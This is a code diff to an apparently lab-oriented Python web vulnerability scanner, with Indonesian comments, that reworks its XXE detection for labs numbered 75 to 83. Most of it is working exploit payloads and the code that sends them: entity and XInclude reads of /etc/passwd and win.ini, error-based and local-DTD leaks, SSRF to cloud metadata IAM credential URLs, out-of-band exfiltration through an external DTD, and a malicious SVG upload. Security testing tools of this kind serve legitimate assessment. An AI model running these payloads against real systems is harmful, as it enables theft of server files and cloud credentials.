+            # Vektor 2: body XML yang memang berisi XInclude.
+            for payload in (xinc, xinc_win):
+                for body in (
+                    f'<?xml version="1.0"?><stockCheck><productId>{payload}</productId><storeId>1</storeId></stockCheck>',
+                    f'<?xml version="1.0"?><root><value>{payload}</value></root>',
+                ):
+                    if not self._within_budget():
+                        return None
+                    resp = self._xxe_post_xml(url, body)
+                    if resp is None or resp.error or not resp.text:
+                        continue
+                    found = self._xxe_file_marker(resp.text)
+                    if found and found[1] not in base_text:
+                        return url, "XML body XInclude", f"{found[0]}: {found[1]}"
+        return None
+
+    def _xxe_try_svg_upload(self, pages: list[Page]):
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        svg = ('<?xml version="1.0" standalone="yes"?>'
+               '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>'
+               '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" '
+               'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
+               '<text font-size="16" x="0" y="16">&xxe;</text></svg>')
+        if not self._lab_session_login():
+            return None
+        targets = ["my-account", "account", "profile"]
+        for path in targets:
+            if not self._within_budget():
+                return None
+            page_resp = self._request("GET", urljoin(base + "/", path), allow_redirects=True)
+            if page_resp.error or not page_resp.text:
+                continue
+            try:
+                soup = BeautifulSoup(page_resp.text, "html.parser")
+            except Exception:
+                continue
+            for form in soup.find_all("form"):
+                file_inputs = [f for f in form.find_all("input")
+                               if (f.get("type") or "").lower() == "file" and f.get("name")]
+                if not file_inputs:
+                    continue
+                action = urljoin(page_resp.url, form.get("action") or page_resp.url)
+                if not self._same_origin(action) or DESTRUCTIVE_PATH_RE.search(urlparse(action).path or "/"):
+                    continue
+                data_fields: dict[str, str] = {}
+                for fld in form.find_all(["input", "select", "textarea"]):
+                    name = fld.get("name")
+                    if not name or fld.has_attr("disabled"):
+                        continue
+                    typ = (fld.get("type") or "").lower() or fld.name
+                    if typ in {"submit", "button", "image", "reset", "file", "password", "checkbox", "radio"}:
+                        continue
+                    data_fields[name] = str(fld.get("value") or "")[:500]
+                for finput in file_inputs[:2]:
+                    if not self._within_budget():
+                        return None
+                    fname = finput.get("name")
+                    try:
+                        raw = self.session.request(
+                            "POST", action, data=data_fields,
+                            files={fname: ("avatar.svg", svg.encode("utf-8"), "image/svg+xml")},
+                            timeout=self.timeout, allow_redirects=True,
+                        )
+                        self.request_count += 1
+                        self.stats["requests"] = self.request_count
+                        body = raw.text or ""
+                    except Exception:
+                        continue
+                    if self._xxe_file_marker(body):
+                        return action, str(fname), body
+                    candidates: list[str] = [raw.url]
+                    try:
+                        soup2 = BeautifulSoup(body, "html.parser")
+                        for tag in soup2.find_all(["img", "a", "link", "source"]):
+                            src = tag.get("src") or tag.get("href")
+                            if src:
+                                candidates.append(urljoin(raw.url, src))
+                    except Exception:
+                        pass
+                    for cand in candidates[:6]:
+                        if not self._within_budget():
+                            return None
+                        if not self._same_origin(cand):
+                            continue
+                        r2 = self._request("GET", cand, allow_redirects=True)
+                        if r2.error or not r2.text:
+                            continue
+                        if self._xxe_file_marker(r2.text):
+                            return cand, str(fname), r2.text
+        return None
 
     def phase_xxe(self, pages: list[Page], points: list[Point]) -> None:
-        """Deteksi konservatif XXE/XInclude berbasis probe terkontrol.
-        Konfirmasi hanya pada bukti kuat dan tidak ambigu: konten file (/etc/passwd, root:x:0:0)
-        muncul di respons, refleksi/eksekusi XInclude terverifikasi, atau interaksi OOB terverifikasi
-        untuk payload spesifik. Tanpa bukti kuat, lab dibiarkan not_confirmed (anti false positive)."""
-        cand_urls = self._xxe_candidate_urls(pages)
-        form_targets = self._xxe_form_targets(pages)
+        """Deteksi XXE/XInclude (75-83) dengan probe multi-vektor.
 
-        def mark(num: int, url: str, kind: str, name: str, ev: str, method_name: str, method: str = "POST", fields=None):
+        Konfirmasi hanya dengan bukti kuat: isi file (marker /etc/passwd atau win.ini) pada respons,
+        kredensial metadata internal (SSRF XXE), atau interaksi/nilai exfiltrasi OOB terverifikasi.
+        Endpoint XML divalidasi lebih dulu dan baseline dibandingkan agar tidak false positive.
+        """
+        if not self._within_budget():
+            return
+        endpoints = self._xxe_endpoints(pages)
+
+        def mark(num: int, url: str, kind: str, name: str, ev: str, method_name: str,
+                 method: str = "POST", fields=None):
             point = Point(key=f"xxe-{num}", kind=kind, label=f"endpoint {url}", url=url,
                           name=name, original="", page_url=url, method=method,
                           fields=tuple(fields) if fields else (), interest=6)
             self._mark(num, point, ev, method_name)
 
-        # --- 75: XXE external entity retrieve files (in-band) ---
-        if 75 not in self._confirmed:
-            bodies = [
+        # --- 75: external entity membaca file (in-band) ---
+        if 75 not in self._confirmed and self._within_budget():
+            hit = self._xxe_try_file_entity(endpoints, ["file:///etc/passwd", "file:///c:/windows/win.ini"])
+            if hit:
+                url, uri, label, sample = hit
+                mark(75, url, "xml", "body",
+                     f"Entitas eksternal XXE terverifikasi: respons memuat isi file {uri} ({label}: {snippet(sample, 80)!r}) "
+                     f"setelah payload dikirim ke {url}; marker tidak ada pada baseline benign.",
+                     "xxe_external_entity_file_read")
+
+        # --- 81: XInclude membaca file (parameter form & body XML) ---
+        if 81 not in self._confirmed and self._within_budget():
+            hit = self._xxe_try_xinclude(endpoints, pages)
+            if hit:
+                url, vector, proof = hit
+                mark(81, url, "xml", "body",
+                     f"XInclude terverifikasi ({vector}): respons memuat isi file lokal melalui xi:include pada {url} "
+                     f"({proof}). Bukti in-band kuat.",
+                     "xxe_xinclude_file_read")
+
+        # --- 80: blind XXE via pesan error ---
+        if 80 not in self._confirmed and self._within_budget():
+            payloads = [
                 ('<?xml version="1.0" encoding="UTF-8"?>'
                  '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
                  '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'),
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
-                 '<foo>&xxe;</foo>'),
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE data [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>'
-                 '<data><id>&file;</id></data>'),
-            ]
-            for url in cand_urls:
-                if 75 in self._confirmed or not self._within_budget():
-                    break
-                for body in bodies:
-                    if 75 in self._confirmed or not self._within_budget():
-                        break
-                    resp = self._xxe_post_xml(url, body)
-                    if self._xxe_file_evidence(resp.text):
-                        ev = (f"Respons dari {url} memuat konten file (/etc/passwd, indikator root:x:0:0) "
-                              f"setelah payload XXE external entity (file:///etc/passwd). Bukti in-band kuat.")
-                        mark(75, url, "xml", "body", ev, "xxe_external_entity_file_read")
-                        break
-            if 75 not in self._confirmed:
-                inj = '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><x>&xxe;</x>'
-                for (url, method, fields) in form_targets:
-                    if 75 in self._confirmed or not self._within_budget():
-                        break
-                    if not fields or method == "get":
-                        continue
-                    for fname in list(fields.keys())[:6]:
-                        if 75 in self._confirmed or not self._within_budget():
-                            break
-                        data = dict(fields)
-                        data[fname] = inj
-                        resp = self._request("POST", url, data=data)
-                        if self._xxe_file_evidence(resp.text):
-                            ev = (f"Respons dari {url} (parameter '{fname}') memuat konten /etc/passwd setelah "
-                                  f"nilai ber-payload XXE external entity. Bukti in-band kuat.")
-                            mark(75, url, "form", fname, ev, "xxe_external_entity_file_read_param",
-                                 method="POST", fields=tuple((n, v, "text") for n, v in fields.items()))
-                            break
-
-        # --- 81: XInclude to retrieve files ---
-        if 81 not in self._confirmed:
-            xinc = ('<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
-                    '<xi:include parse="text" href="file:///etc/passwd"/></foo>')
-            for (url, method, fields) in form_targets:
-                if 81 in self._confirmed or not self._within_budget():
-                    break
-                if not fields or method != "post":
-                    continue
-                for fname in list(fields.keys())[:6]:
-                    if 81 in self._confirmed or not self._within_budget():
-                        break
-                    data = dict(fields)
-                    data[fname] = xinc
-                    resp = self._request("POST", url, data=data)
-                    if self._xxe_file_evidence(resp.text):
-                        ev = (f"Respons dari {url} (parameter '{fname}', POST form) memuat konten /etc/passwd "
-                              f"setelah injeksi XInclude (xi:include file:///etc/passwd). Bukti in-band kuat.")
-                        mark(81, url, "form", fname, ev, "xxe_xinclude_file_read",
-                             method="POST", fields=tuple((n, v, "text") for n, v in fields.items()))
-                        break
-            if 81 not in self._confirmed:
-                bodies = [
-                    f'<?xml version="1.0"?><root><value>{xinc}</value></root>',
-                    f'<?xml version="1.0"?><stockCheck><productId>{xinc}</productId><storeId>1</storeId></stockCheck>',
-                    '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude">'
-                    '<xi:include parse="text" href="file:///etc/passwd"/></foo>',
-                ]
-                for url in cand_urls:
-                    if 81 in self._confirmed or not self._within_budget():
-                        break
-                    for body in bodies:
-                        if 81 in self._confirmed or not self._within_budget():
-                            break
-                        resp = self._xxe_post_xml(url, body)
-                        if self._xxe_file_evidence(resp.text):
-                            ev = (f"Respons dari {url} memuat konten /etc/passwd setelah payload XInclude dalam body XML. "
-                                  f"Bukti in-band kuat.")
-                            mark(81, url, "xml", "body", ev, "xxe_xinclude_file_read_xmlbody")
-                            break
-
-        # --- 80: Blind XXE to retrieve data via error messages ---
-        if 80 not in self._confirmed:
-            bodies = [
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
-                 '<stockCheck><productId>&xxe;</productId></stockCheck>'),
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
-                 '<foo>&xxe;</foo>'),
                 ('<?xml version="1.0" encoding="UTF-8"?>'
                  '<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd">'
                  '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///invalid/%file;\'>">'
                  '%eval;%exfil; ]><foo>bar</foo>'),
             ]
-            for url in cand_urls:
+            for url in endpoints:
                 if 80 in self._confirmed or not self._within_budget():
                     break
-                for body in bodies:
-                    if 80 in self._confirmed or not self._within_budget():
-                        break
+                ready, baseline = self._xxe_endpoint_ready(url)
+                if not ready:
+                    continue
+                base_text = (baseline.text or "") if baseline else ""
+                for body in payloads:
                     resp = self._xxe_post_xml(url, body)
-                    if self._xxe_file_evidence(resp.text):
-                        if self._xxe_error_context(resp):
-                            ev = (f"Respons error dari {url} memuat konten file (/etc/passwd) setelah payload XXE, "
-                                  f"menunjukkan kebocoran data melalui pesan error. Bukti berbasis respons terverifikasi.")
-                        else:
-                            ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload XXE pemicu error/kebocoran, "
-                                  f"data terambil (bukti terverifikasi).")
-                        mark(80, url, "xml", "body", ev, "xxe_blind_error_message_leak")
-                        break
+                    if resp is None or resp.error or not resp.text:
+                        continue
+                    found = self._xxe_file_marker(resp.text)
+                    if not found or found[1] in base_text:
+                        continue
+                    label, sample = found
+                    mark(80, url, "xml", "body",
+                         f"Kebocoran via pesan error XXE terverifikasi di {url}: respons memuat isi file "
+                         f"({label}: {snippet(sample, 80)!r}) setelah payload pemicu error.",
+                         "xxe_blind_error_message_leak")
+                    break
 
-        # --- 83: repurposing a local DTD ---
-        if 83 not in self._confirmed:
+        # --- 83: repurposing local DTD ---
+        if 83 not in self._confirmed and self._within_budget():
             payloads = [
                 ('<?xml version="1.0" encoding="UTF-8"?>'
                  '<!DOCTYPE message ['
                  '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
-                 '<!ENTITY % ISOamso \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
+                 '<!ENTITY % ISOamso \''
+                 '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
                  '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                 '&#x25;eval;&#x25;error;\'>'
+                 '&#x25;eval;'
+                 '&#x25;error;'
+                 '\'>'
                  '%local_dtd;'
-                 ']><stockCheck><productId>1</productId></stockCheck>'),
+                 ']><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'),
                 ('<?xml version="1.0" encoding="UTF-8"?>'
                  '<!DOCTYPE message ['
                  '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
-                 '<!ENTITY % ISOgrk1 \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
+                 '<!ENTITY % ISOgrk1 \''
+                 '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
                  '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                 '&#x25;eval;&#x25;error;\'>'
+                 '&#x25;eval;'
+                 '&#x25;error;'
+                 '\'>'
                  '%local_dtd;'
-                 ']><stockCheck><productId>1</productId></stockCheck>'),
+                 ']><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'),
                 ('<?xml version="1.0" encoding="UTF-8"?>'
                  '<!DOCTYPE message ['
                  '<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">'
-                 '<!ENTITY % expr \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
+                 '<!ENTITY % expr \''
+                 '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
                  '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                 '&#x25;eval;&#x25;error;\'>'
+                 '&#x25;eval;'
+                 '&#x25;error;'
+                 '\'>'
                  '%local_dtd;'
                  ']><foo>1</foo>'),
             ]
-            for url in cand_urls:
+            for url in endpoints:
                 if 83 in self._confirmed or not self._within_budget():
                     break
+                ready, baseline = self._xxe_endpoint_ready(url)
+                if not ready:
+                    continue
+                base_text = (baseline.text or "") if baseline else ""
                 for body in payloads:
-                    if 83 in self._confirmed or not self._within_budget():
-                        break
                     resp = self._xxe_post_xml(url, body)
-                    if self._xxe_file_evidence(resp.text):
-                        ev = (f"Respons dari {url} memuat konten file (/etc/passwd) setelah payload repurposing local DTD "
-                              f"(redefinisi entitas lokal memicu kebocoran). Bukti berbasis respons terverifikasi.")
-                        mark(83, url, "xml", "body", ev, "xxe_repurpose_local_dtd")
+                    if resp is None or resp.error or not resp.text:
+                        continue
+                    found = self._xxe_file_marker(resp.text)
+                    if not found or found[1] in base_text:
+                        continue
+                    label, sample = found
+                    mark(83, url, "xml", "body",
+                         f"Repurposing local DTD terverifikasi di {url}: redefinisi entitas pada DTD lokal memicu "
+                         f"kebocoran file ({label}: {snippet(sample, 80)!r}).",
+                         "xxe_repurpose_local_dtd")
+                    break
+
+        # --- 76: XXE ke SSRF (metadata internal in-band, atau interaksi OOB) ---
+        if 76 not in self._confirmed and self._within_budget():
+            for url in endpoints:
+                if 76 in self._confirmed or not self._within_budget():
+                    break
+                ready, baseline = self._xxe_endpoint_ready(url)
+                if not ready:
+                    continue
+                base_text = (baseline.text or "") if baseline else ""
+                internal_uris = (
+                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
+                    "http://169.254.169.254/latest/meta-data/",
+                    "http://169.254.169.254/latest/dynamic/instance-identity/document",
+                )
+                for uri in internal_uris:
+                    if 76 in self._confirmed or not self._within_budget():
+                        break
+                    for body in self._xxe_bodies(uri):
+                        resp = self._xxe_post_xml(url, body)
+                        if resp is None or resp.error or not resp.text:
+                            continue
+                        found = self._xxe_metadata_marker(resp.text)
+                        if not found or found[1] in base_text:
+                            continue
+                        label, sample = found
+                        mark(76, url, "xml", "body",
+                             f"XXE SSRF terverifikasi di {url}: parser mengambil URL internal {uri} dan respons "
+                             f"memuat data internal ({label}: {snippet(sample, 100)!r}).",
+                             "xxe_ssrf_internal_metadata")
                         break
 
-        # --- 76,77,78,79: Blind XXE / SSRF via XXE (butuh interaksi/exfil OOB terverifikasi) ---
+        # --- 77/78/79: blind XXE via OOB (interaksi/nilai exfil terverifikasi) ---
         if self.oob and getattr(self.oob, "domain", None):
             oob_domain = self.oob.domain
             oob_token = getattr(self.oob, "token", "") or ""
@@ -6519,195 +7179,71 @@ class SatriaBaruScanner:
                 except Exception:
                     return None
 
-            if 76 not in self._confirmed:
-                u = _oob_url("ssrf76")
-                for url in cand_urls:
-                    if 76 in self._confirmed or not self._within_budget():
-                        break
-                    for body in [
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{u}"> ]><stockCheck><productId>&xxe;</productId></stockCheck>',
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{u}"> ]><foo>&xxe;</foo>',
-                    ]:
-                        if 76 in self._confirmed or not self._within_budget():
-                            break
-                        self._xxe_post_xml(url, body)
-                        got = _poll()
-                        if got and getattr(got, "interactions", None):
-                            ev = (f"Interaksi OOB/SSRF terverifikasi: parser XML melakukan permintaan server-side ke {u} "
-                                  f"setelah payload XXE dikirim ke {url}. Bukti interaksi out-of-band terverifikasi.")
-                            mark(76, url, "xml", "body", ev, "xxe_ssrf_oob_interaction")
-                            break
-
-            if 77 not in self._confirmed:
-                u = _oob_url("oob77")
-                for url in cand_urls:
+            if 77 not in self._confirmed and self._within_budget():
+                uri = _oob_url(f"xxe77{uuid.uuid4().hex[:4]}")
+                for url in endpoints[:5]:
                     if 77 in self._confirmed or not self._within_budget():
                         break
-                    for body in [
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{u}"> ]><stockCheck><productId>&xxe;</productId></stockCheck>',
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{u}"> ]><foo>&xxe;</foo>',
-                    ]:
-                        if 77 in self._confirmed or not self._within_budget():
-                            break
+                    for body in self._xxe_bodies(uri):
                         self._xxe_post_xml(url, body)
                         got = _poll()
                         if got and getattr(got, "interactions", None):
-                            ev = (f"Interaksi OOB terverifikasi (external entity) ke {u} setelah payload XXE dikirim ke {url}. "
-                                  f"Bukti interaksi out-of-band terverifikasi.")
-                            mark(77, url, "xml", "body", ev, "xxe_blind_oob_interaction")
+                            mark(77, url, "xml", "body",
+                                 f"Interaksi OOB terverifikasi (external entity) ke {uri} setelah payload XXE "
+                                 f"dikirim ke {url}. Bukti blind XXE out-of-band.",
+                                 "xxe_blind_oob_interaction")
                             break
 
-            if 78 not in self._confirmed:
-                u = _oob_url("pe78")
-                for url in cand_urls:
+            if 78 not in self._confirmed and self._within_budget():
+                uri = _oob_url(f"xxe78{uuid.uuid4().hex[:4]}")
+                for url in endpoints[:5]:
                     if 78 in self._confirmed or not self._within_budget():
                         break
-                    for body in [
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{u}"> %xxe; ]><stockCheck><productId>1</productId></stockCheck>',
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{u}"> %xxe; ]><foo>1</foo>',
-                    ]:
-                        if 78 in self._confirmed or not self._within_budget():
-                            break
+                    for body in (
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>',
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]><foo>1</foo>',
+                    ):
                         self._xxe_post_xml(url, body)
                         got = _poll()
                         if got and getattr(got, "interactions", None):
-                            ev = (f"Interaksi OOB terverifikasi via parameter entity (%xxe;) ke {u} setelah payload dikirim ke {url}. "
-                                  f"Bukti interaksi out-of-band terverifikasi.")
-                            mark(78, url, "xml", "body", ev, "xxe_blind_oob_parameter_entity")
+                            mark(78, url, "xml", "body",
+                                 f"Interaksi OOB terverifikasi via parameter entity (%xxe;) ke {uri} setelah payload "
+                                 f"dikirim ke {url}. Bukti blind XXE out-of-band.",
+                                 "xxe_blind_oob_parameter_entity")
                             break
 
-            if 79 not in self._confirmed:
-                u = _oob_url("dtd79")
-                for url in cand_urls:
+            if 79 not in self._confirmed and self._within_budget():
+                uri = _oob_url(f"xxe79{uuid.uuid4().hex[:4]}")
+                for url in endpoints[:5]:
                     if 79 in self._confirmed or not self._within_budget():
                         break
-                    for body in [
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{u}"> %xxe; ]><foo>1</foo>',
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "{u}"> %dtd; ]><foo>1</foo>',
-                    ]:
-                        if 79 in self._confirmed or not self._within_budget():
-                            break
+                    for body in (
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "{uri}"> %dtd; ]><foo>1</foo>',
+                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]><foo>1</foo>',
+                    ):
                         self._xxe_post_xml(url, body)
                         got = _poll()
                         vals = getattr(got, "values", None) if got else None
-                        if vals:
-                            val = vals[0] if isinstance(vals, (list, tuple)) else vals
-                            ev = (f"Data exfiltrasi OOB terverifikasi (nilai tertangkap: {snippet(str(val), 120)}) "
-                                  f"setelah payload XXE ke {url}. Bukti interaksi/OOB terverifikasi.")
-                            mark(79, url, "xml", "body", ev, "xxe_blind_oob_exfil_dtd")
-                            break
-
-        # --- 82: XXE via image file upload (SVG ber-XXE) ---
-        if 82 not in self._confirmed:
-            svg_xxe = ('<?xml version="1.0" standalone="yes"?>'
-                       '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>'
-                       '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" '
-                       'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
-                       '<text font-size="16" x="0" y="16">&xxe;</text></svg>')
-            for page in pages:
-                if 82 in self._confirmed or not self._within_budget():
-                    break
-                try:
-                    soup = BeautifulSoup(page.text or "", "html.parser")
-                except Exception:
-                    continue
-                for form in soup.find_all("form"):
-                    if 82 in self._confirmed or not self._within_budget():
+                        if not vals:
+                            continue
+                        val = vals[0] if isinstance(vals, (list, tuple)) else vals
+                        mark(79, url, "xml", "body",
+                             f"Exfiltrasi data OOB terverifikasi (nilai tertangkap: {snippet(str(val), 120)}) setelah "
+                             f"payload XXE dengan external DTD dikirim ke {url}.",
+                             "xxe_blind_oob_exfil_dtd")
                         break
-                    action = urljoin(page.url, form.get("action") or page.url)
-                    if not self._same_origin(action):
-                        continue
-                    if DESTRUCTIVE_PATH_RE.search(urlparse(action).path or "/"):
-                        continue
-                    method = (form.get("method") or "get").lower()
-                    if method != "post":
-                        continue
-                    file_inputs = [f for f in form.find_all("input") if (f.get("type") or "").lower() == "file" and f.get("name")]
-                    if not file_inputs:
-                        continue
-                    data_fields: dict[str, str] = {}
-                    for field in form.find_all(["input", "select", "textarea"]):
-                        name = field.get("name")
-                        if not name or field.has_attr("disabled"):
-                            continue
-                        typ = (field.get("type") or "").lower() or field.name
-                        if typ in {"submit", "button", "image", "reset", "file"}:
-                            continue
-                        val = str(field.get("value") or "")
-                        if field.name == "textarea":
-                            val = field.text or ""
-                        elif field.name == "select":
-                            selected = field.find("option", selected=True) or field.find("option")
-                            val = str(selected.get("value") or selected.text or "") if selected else ""
-                        data_fields[name] = val[:500]
-                    for fin in file_inputs[:2]:
-                        if 82 in self._confirmed or not self._within_budget():
-                            break
-                        fin_name = fin.get("name")
-                        for fname_up, ctype in (("avatar.svg", "image/svg+xml"), ("avatar.svg", "text/xml"), ("image.svg", "image/svg+xml")):
-                            if 82 in self._confirmed or not self._within_budget():
-                                break
-                            if not self._within_budget():
-                                break
-                            started = time.monotonic()
-                            try:
-                                resp_raw = self.session.request(
-                                    "POST", action, data=data_fields,
-                                    files={fin_name: (fname_up, svg_xxe.encode("utf-8"), ctype)},
-                                    timeout=self.timeout, allow_redirects=False,
-                                )
-                                elapsed = time.monotonic() - started
-                                self.request_count += 1
-                                self.stats["requests"] = self.request_count
-                                resp = Response(status=resp_raw.status_code, url=resp_raw.url,
-                                                text=resp_raw.text or "", headers=dict(resp_raw.headers), elapsed=elapsed)
-                            except requests.RequestException as exc:
-                                elapsed = time.monotonic() - started
-                                self.request_count += 1
-                                self.stats["requests"] = self.request_count
-                                resp = Response(None, action, "", {}, elapsed, error=f"{type(exc).__name__}: {str(exc)[:160]}")
-                            except Exception as exc:
-                                elapsed = time.monotonic() - started
-                                self.request_count += 1
-                                self.stats["requests"] = self.request_count
-                                resp = Response(None, action, "", {}, elapsed, error=f"{type(exc).__name__}: {str(exc)[:160]}")
-                            if self._xxe_file_evidence(resp.text):
-                                ev = (f"Respons upload di {action} (field file '{fin_name}') memuat konten /etc/passwd "
-                                      f"setelah upload SVG ber-payload XXE. Bukti in-band kuat.")
-                                mark(82, action, "upload", fin_name, ev, "xxe_image_upload_file_read")
-                                break
-                            candidate_urls = []
-                            loc = self._resp_header(resp.headers, "Location")
-                            if loc:
-                                candidate_urls.append(urljoin(action, loc))
-                            try:
-                                soup_r = BeautifulSoup(resp.text or "", "html.parser")
-                                for tag in soup_r.find_all(["img", "a", "link", "source"]):
-                                    src = tag.get("src") or tag.get("href")
-                                    if src:
-                                        candidate_urls.append(urljoin(action, src))
-                            except Exception:
-                                pass
-                            checked = set()
-                            for cu in candidate_urls[:6]:
-                                try:
-                                    cu2 = canonical_url(cu)
-                                except Exception:
-                                    cu2 = cu
-                                if cu2 in checked or not self._same_origin(cu2):
-                                    continue
-                                checked.add(cu2)
-                                if not self._within_budget():
-                                    break
-                                r2 = self._request("GET", cu2, allow_redirects=True)
-                                if self._xxe_file_evidence(r2.text):
-                                    ev = (f"Konten /etc/passwd terungkap saat mengambil resource hasil upload ({cu2}) "
-                                          f"dari {action} (field '{fin_name}', SVG XXE). Bukti in-band kuat.")
-                                    mark(82, cu2, "upload", fin_name, ev, "xxe_image_upload_file_read_resource")
-                                    break
 
-        # Tanpa bukti kuat (file/error-leak terverifikasi, interaksi/exfil OOB terverifikasi),
-        # lab 75-83 tetap not_confirmed (anti false positive).
+        # --- 82: XXE via upload gambar SVG ---
+        if 82 not in self._confirmed and self._within_budget():
+            hit = self._xxe_try_svg_upload(pages)
+            if hit:
+                url, field, body = hit
+                found = self._xxe_file_marker(body)
+                proof = f"{found[0]}: {snippet(found[1], 60)!r}" if found else "isi file"
+                mark(82, url, "upload", field,
+                     f"XXE via upload gambar terverifikasi: SVG ber-payload XXE diunggah melalui field '{field}' dan "
+                     f"respons/resource hasil upload ({url}) memuat isi file lokal ({proof}).",
+                     "xxe_image_upload_file_read")
 
     def report(self) -> dict[str, Any]:
         labs = []
